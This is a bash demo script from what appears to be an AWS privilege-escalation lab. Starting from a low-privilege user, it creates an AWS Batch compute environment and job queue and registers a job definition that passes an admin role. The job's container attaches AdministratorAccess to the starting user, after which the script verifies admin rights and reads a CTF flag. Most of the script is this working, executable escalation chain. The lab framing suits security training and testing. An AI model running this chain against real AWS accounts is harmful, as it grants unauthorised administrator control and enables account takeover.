#!/bin/bash

# Demo script for iam:PassRole + batch:CreateComputeEnvironment + batch:CreateJobQueue +
# batch:RegisterJobDefinition + batch:SubmitJob privilege escalation
#
# This scenario demonstrates how a user with iam:PassRole and broad Batch permissions
# creates the entire Batch pipeline from scratch — compute environment, job queue, job
# definition with admin jobRoleArn — and submits a job to escalate to admin.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-batch-003-to-admin-starting-user"
COMPUTE_ENV_NAME="pl-prod-batch-003-to-admin-compute-env"
JOB_QUEUE_NAME="pl-prod-batch-003-to-admin-job-queue"
JOB_DEF_NAME="pl-prod-batch-003-to-admin-privesc-job-def"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AWS Batch Full Pipeline Creation to Admin${NC}"
echo -e "${GREEN}Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${YELLOW}This demo creates the entire AWS Batch pipeline from scratch —${NC}"
echo -e "${YELLOW}compute environment, job queue, job definition with admin jobRoleArn —${NC}"
echo -e "${YELLOW}then submits a job to attach AdministratorAccess to the starting user.${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_batch_003_iam_passrole_batch_createcomputeenvironment_batch_createjobqueue_batch_registerjobdefinition_batch_submitjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract scenario-specific resource info
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
EXECUTION_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.execution_role_arn')
SECURITY_GROUP_ID=$(echo "$MODULE_OUTPUT" | jq -r '.security_group_id')
SUBNET_ID=$(echo "$MODULE_OUTPUT" | jq -r '.subnet_id')

# Get readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get admin cleanup credentials for the exit trap — Batch resource teardown
# (terminate/disable/delete) is a cleanup operation, not part of the exploit,
# so it runs as admin rather than granting Update/Delete Batch permissions
# to the starting user.
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Execution Role ARN: $EXECUTION_ROLE_ARN"
echo "Subnet: $SUBNET_ID"
echo "Security Group: $SECURITY_GROUP_ID"
echo "Region: $AWS_REGION"
echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential helper functions
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    export AWS_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}

use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    export AWS_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}

use_admin_creds() {
    # Used by the exit trap to tear down Batch resources on failure — cleanup,
    # not part of the exploit, so it runs as admin rather than the starting user.
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
    export AWS_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Track demo state for trap — the demo creates a compute environment and job queue
# that persist and incur charges if the script dies mid-run. The trap best-effort
# deletes them on any non-SIGKILL exit.
DEMO_COMPUTE_ENV_CREATED=0
DEMO_JOB_QUEUE_CREATED=0
DEMO_JOB_SUBMITTED=0
DEMO_COMPLETED=0
JOB_ID=""

_batch_demo_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM

    if [ "$DEMO_COMPLETED" = "1" ]; then
        exit $exit_code
    fi

    echo ""
    echo -e "\033[0;31m[trap] Demo did not complete cleanly — best-effort cleanup of created Batch resources\033[0m"

    # Terminate any running job
    if [ "$DEMO_JOB_SUBMITTED" = "1" ] && [ -n "$JOB_ID" ]; then
        echo -e "\033[0;31m[trap] Terminating Batch job $JOB_ID\033[0m"
        use_admin_creds
        aws batch terminate-job \
            --job-id "$JOB_ID" \
            --reason "demo-exit-cleanup" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    # Disable and delete job queue
    if [ "$DEMO_JOB_QUEUE_CREATED" = "1" ]; then
        echo -e "\033[0;31m[trap] Disabling job queue $JOB_QUEUE_NAME\033[0m"
        use_admin_creds
        aws batch update-job-queue \
            --job-queue "$JOB_QUEUE_NAME" \
            --state DISABLED \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
        sleep 5
        echo -e "\033[0;31m[trap] Deleting job queue $JOB_QUEUE_NAME\033[0m"
        aws batch delete-job-queue \
            --job-queue "$JOB_QUEUE_NAME" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    # Disable and delete compute environment
    if [ "$DEMO_COMPUTE_ENV_CREATED" = "1" ]; then
        echo -e "\033[0;31m[trap] Disabling compute environment $COMPUTE_ENV_NAME\033[0m"
        use_admin_creds
        aws batch update-compute-environment \
            --compute-environment "$COMPUTE_ENV_NAME" \
            --state DISABLED \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
        sleep 5
        echo -e "\033[0;31m[trap] Deleting compute environment $COMPUTE_ENV_NAME\033[0m"
        aws batch delete-compute-environment \
            --compute-environment "$COMPUTE_ENV_NAME" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _batch_demo_exit_handler EXIT INT TERM

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
use_starting_creds
export AWS_REGION=$AWS_REGION
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create Fargate compute environment
# This is the first step in building the attack pipeline — creating a managed Fargate
# compute environment that Batch will use to run containers.
echo -e "${YELLOW}Step 5: [EXPLOIT] Creating Fargate compute environment${NC}"
echo "Compute Environment: $COMPUTE_ENV_NAME"
echo "Subnet: $SUBNET_ID"
echo "Security Group: $SECURITY_GROUP_ID"
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION

# Set flag before the create call so the trap fires even if the script dies mid-creation
DEMO_COMPUTE_ENV_CREATED=1

show_attack_cmd "Attacker" "aws batch create-compute-environment --region $AWS_REGION --compute-environment-name $COMPUTE_ENV_NAME --type MANAGED --state ENABLED --compute-resources '{\"type\":\"FARGATE\",\"maxvCpus\":2,\"subnets\":[\"$SUBNET_ID\"],\"securityGroupIds\":[\"$SECURITY_GROUP_ID\"]}'"
COMPUTE_ENV_OUTPUT=$(aws batch create-compute-environment \
    --region $AWS_REGION \
    --compute-environment-name "$COMPUTE_ENV_NAME" \
    --type MANAGED \
    --state ENABLED \
    --compute-resources "{
        \"type\": \"FARGATE\",
        \"maxvCpus\": 2,
        \"subnets\": [\"$SUBNET_ID\"],
        \"securityGroupIds\": [\"$SECURITY_GROUP_ID\"]
    }" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create compute environment${NC}"
    exit 1
fi

COMPUTE_ENV_ARN=$(echo "$COMPUTE_ENV_OUTPUT" | jq -r '.computeEnvironmentArn')
echo "Compute Environment ARN: $COMPUTE_ENV_ARN"
echo -e "${GREEN}Successfully created compute environment!${NC}\n"

# [OBSERVATION] Step 6: Wait for compute environment to reach VALID status
# Fargate compute environments typically take 30-90 seconds to become VALID.
echo -e "${YELLOW}Step 6: [OBSERVATION] Waiting for compute environment to reach VALID status${NC}"
echo "This may take 30-90 seconds..."
echo ""

use_readonly_creds
export AWS_REGION=$AWS_REGION

MAX_WAIT=180  # 3 minutes max
ELAPSED=0
POLL_INTERVAL=15

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws batch describe-compute-environments --region $AWS_REGION --compute-environments $COMPUTE_ENV_NAME --query 'computeEnvironments[0].status' --output text"
    CE_STATUS=$(aws batch describe-compute-environments \
        --region $AWS_REGION \
        --compute-environments "$COMPUTE_ENV_NAME" \
        --query 'computeEnvironments[0].status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "Compute environment status: $CE_STATUS (elapsed: ${ELAPSED}s)"

    if [ "$CE_STATUS" == "VALID" ]; then
        echo -e "${GREEN}Compute environment is VALID!${NC}\n"
        break
    elif [ "$CE_STATUS" == "INVALID" ]; then
        echo -e "${RED}Error: Compute environment entered INVALID state${NC}"
        STATUS_REASON=$(aws batch describe-compute-environments \
            --region $AWS_REGION \
            --compute-environments "$COMPUTE_ENV_NAME" \
            --query 'computeEnvironments[0].statusReason' \
            --output text 2>/dev/null)
        echo "Reason: $STATUS_REASON"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for compute environment to become VALID (${MAX_WAIT}s)${NC}"
    exit 1
fi

# [EXPLOIT] Step 7: Create job queue wired to the compute environment
echo -e "${YELLOW}Step 7: [EXPLOIT] Creating job queue${NC}"
echo "Job Queue: $JOB_QUEUE_NAME"
echo "Compute Environment: $COMPUTE_ENV_NAME"
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION

# Set flag before the create call
DEMO_JOB_QUEUE_CREATED=1

show_attack_cmd "Attacker" "aws batch create-job-queue --region $AWS_REGION --job-queue-name $JOB_QUEUE_NAME --state ENABLED --priority 1 --compute-environment-order '[{\"order\":1,\"computeEnvironment\":\"$COMPUTE_ENV_NAME\"}]'"
JOB_QUEUE_OUTPUT=$(aws batch create-job-queue \
    --region $AWS_REGION \
    --job-queue-name "$JOB_QUEUE_NAME" \
    --state ENABLED \
    --priority 1 \
    --compute-environment-order "[
        {\"order\": 1, \"computeEnvironment\": \"$COMPUTE_ENV_NAME\"}
    ]" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create job queue${NC}"
    exit 1
fi

JOB_QUEUE_ARN=$(echo "$JOB_QUEUE_OUTPUT" | jq -r '.jobQueueArn')
echo "Job Queue ARN: $JOB_QUEUE_ARN"
echo -e "${GREEN}Successfully created job queue!${NC}\n"

# Brief wait for job queue to stabilize
echo -e "${YELLOW}Waiting 15 seconds for job queue to become active...${NC}"
sleep 15
echo -e "${GREEN}Job queue ready${NC}\n"

# [EXPLOIT] Step 8: Register Batch job definition with admin role as jobRoleArn
# This is the privilege escalation vector — passing the admin role as the container's
# jobRoleArn so the Batch job runs with admin permissions.
echo -e "${YELLOW}Step 8: [EXPLOIT] Registering Batch job definition with admin role${NC}"
echo "Job Definition Name: $JOB_DEF_NAME"
echo "Admin Role (jobRoleArn): $ADMIN_ROLE_ARN"
echo "Execution Role: $EXECUTION_ROLE_ARN"
echo ""
echo "The Batch job will run the AWS CLI to attach AdministratorAccess to our starting user."

use_starting_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker" "aws batch register-job-definition --region $AWS_REGION --job-definition-name $JOB_DEF_NAME --type container --platform-capabilities FARGATE --container-properties '{\"image\":\"amazon/aws-cli:latest\",\"jobRoleArn\":\"$ADMIN_ROLE_ARN\",\"executionRoleArn\":\"$EXECUTION_ROLE_ARN\",\"resourceRequirements\":[{\"type\":\"VCPU\",\"value\":\"0.25\"},{\"type\":\"MEMORY\",\"value\":\"512\"}],\"networkConfiguration\":{\"assignPublicIp\":\"ENABLED\"},\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"$STARTING_USER\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}'"

JOB_DEF_OUTPUT=$(aws batch register-job-definition \
    --region $AWS_REGION \
    --job-definition-name "$JOB_DEF_NAME" \
    --type container \
    --platform-capabilities FARGATE \
    --container-properties "{
        \"image\": \"amazon/aws-cli:latest\",
        \"jobRoleArn\": \"$ADMIN_ROLE_ARN\",
        \"executionRoleArn\": \"$EXECUTION_ROLE_ARN\",
        \"resourceRequirements\": [
            {\"type\": \"VCPU\", \"value\": \"0.25\"},
            {\"type\": \"MEMORY\", \"value\": \"512\"}
        ],
        \"networkConfiguration\": {
            \"assignPublicIp\": \"ENABLED\"
        },
        \"command\": [
            \"iam\", \"attach-user-policy\",
            \"--user-name\", \"$STARTING_USER\",
            \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"
        ]
    }" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to register job definition${NC}"
    exit 1
fi

JOB_DEF_ARN=$(echo "$JOB_DEF_OUTPUT" | jq -r '.jobDefinitionArn')
JOB_DEF_REVISION=$(echo "$JOB_DEF_OUTPUT" | jq -r '.revision')
echo "Job Definition ARN: $JOB_DEF_ARN"
echo "Revision: $JOB_DEF_REVISION"
echo -e "${GREEN}Successfully registered job definition with admin role!${NC}\n"

# [EXPLOIT] Step 9: Submit the Batch job
echo -e "${YELLOW}Step 9: [EXPLOIT] Submitting Batch job to the queue${NC}"
echo "Job Queue: $JOB_QUEUE_NAME"
echo "Job Definition: ${JOB_DEF_NAME}:${JOB_DEF_REVISION}"

use_starting_creds
export AWS_REGION=$AWS_REGION

# Set flag before the submit call so the trap fires even if the script dies mid-submission
DEMO_JOB_SUBMITTED=1

show_attack_cmd "Attacker" "aws batch submit-job --region $AWS_REGION --job-name pl-batch-003-privesc-job --job-queue $JOB_QUEUE_NAME --job-definition ${JOB_DEF_NAME}:${JOB_DEF_REVISION}"
JOB_OUTPUT=$(aws batch submit-job \
    --region $AWS_REGION \
    --job-name "pl-batch-003-privesc-job" \
    --job-queue "$JOB_QUEUE_NAME" \
    --job-definition "${JOB_DEF_NAME}:${JOB_DEF_REVISION}" \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to submit job${NC}"
    exit 1
fi

JOB_ID=$(echo "$JOB_OUTPUT" | jq -r '.jobId')
echo "Job ID: $JOB_ID"
echo -e "${GREEN}Successfully submitted Batch job!${NC}\n"

# [OBSERVATION] Step 10: Wait for the Batch job to complete
echo -e "${YELLOW}Step 10: [OBSERVATION] Waiting for Batch job to complete${NC}"
echo "This may take a few minutes as Fargate provisions the container..."
echo ""

use_readonly_creds
export AWS_REGION=$AWS_REGION

MAX_WAIT=360  # 6 minutes max
ELAPSED=0
POLL_INTERVAL=15

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws batch describe-jobs --region $AWS_REGION --jobs $JOB_ID --query 'jobs[0].status' --output text"
    JOB_STATUS=$(aws batch describe-jobs \
        --region $AWS_REGION \
        --jobs "$JOB_ID" \
        --query 'jobs[0].status' \
        --output text)

    echo "Job status: $JOB_STATUS (elapsed: ${ELAPSED}s)"

    if [ "$JOB_STATUS" == "SUCCEEDED" ]; then
        echo -e "${GREEN}Batch job completed successfully!${NC}\n"
        break
    elif [ "$JOB_STATUS" == "FAILED" ]; then
        echo -e "${RED}Error: Batch job failed${NC}"
        # Show failure reason
        FAILURE_REASON=$(aws batch describe-jobs \
            --region $AWS_REGION \
            --jobs "$JOB_ID" \
            --query 'jobs[0].statusReason' \
            --output text 2>/dev/null)
        echo "Failure reason: $FAILURE_REASON"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for Batch job to complete (${MAX_WAIT}s)${NC}"
    echo "Job ID: $JOB_ID"
    echo "Check the job status manually with: aws batch describe-jobs --region $AWS_REGION --jobs $JOB_ID"
    exit 1
fi

# [OBSERVATION] Step 11: Verify privilege escalation
echo -e "${YELLOW}Step 11: [OBSERVATION] Verifying privilege escalation${NC}"
echo "Checking if AdministratorAccess was attached to our starting user..."

# Wait for IAM policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
sleep 15
echo -e "${GREEN}Policy propagated${NC}\n"

use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json)

echo "$ATTACHED_POLICIES" | jq '.'

# Check if AdministratorAccess is attached
if echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[].PolicyArn' | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}AdministratorAccess policy is attached to $STARTING_USER!${NC}"
else
    echo -e "${RED}AdministratorAccess policy not found on user${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 12: Verify admin access as the starting user
echo -e "${YELLOW}Step 12: Verifying administrator access (as starting user)${NC}"
echo "Attempting to list IAM users with the starting user's now-elevated credentials..."

use_starting_creds
export AWS_REGION=$AWS_REGION
show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}Successfully listed IAM users!${NC}"
    echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 13: Capture the CTF flag
# The starting user now has AdministratorAccess, which grants ssm:GetParameter implicitly.
# Use those credentials to read the scenario flag from SSM Parameter Store.
echo -e "${YELLOW}Step 13: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/batch-003-to-admin"
use_starting_creds
export AWS_REGION=$AWS_REGION

FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region $AWS_REGION"
    FLAG_VALUE=$(aws ssm get-parameter \
        --region "$AWS_REGION" \
        --name "$FLAG_PARAM_NAME" \
        --query 'Parameter.Value' \
        --output text 2>/dev/null || true)

    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $attempt: not yet readable -- sleeping 10s for SSM auth propagation...${NC}"
    sleep 10
done

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
    echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as completed so the exit trap skips resource cleanup
DEMO_COMPLETED=1

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole and broad Batch permissions)"
echo "2. Created Fargate compute environment: $COMPUTE_ENV_NAME"
echo "3. Created job queue: $JOB_QUEUE_NAME"
echo "4. Registered job definition passing admin role as jobRoleArn"
echo "5. Submitted a Batch job which ran an AWS CLI container with admin permissions"
echo "6. The container attached AdministratorAccess to our starting user"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER -> (CreateComputeEnvironment + CreateJobQueue + RegisterJobDefinition + PassRole)"
echo -e "  -> Batch Job with $ADMIN_ROLE_NAME -> (SubmitJob) -> Container attaches AdministratorAccess -> Admin"
echo -e "  -> (ssm:GetParameter) -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Compute Environment: $COMPUTE_ENV_NAME"
echo "- Job Queue: $JOB_QUEUE_NAME"
echo "- Job Definition: $JOB_DEF_NAME (revision $JOB_DEF_REVISION)"
echo "- Batch Job: $JOB_ID"
echo "- Attached Policy: AdministratorAccess on $STARTING_USER"

echo -e "\n${RED}Warning: AdministratorAccess policy is attached to $STARTING_USER${NC}"
echo -e "${RED}Warning: Batch compute environment, job queue, and job definition remain active${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
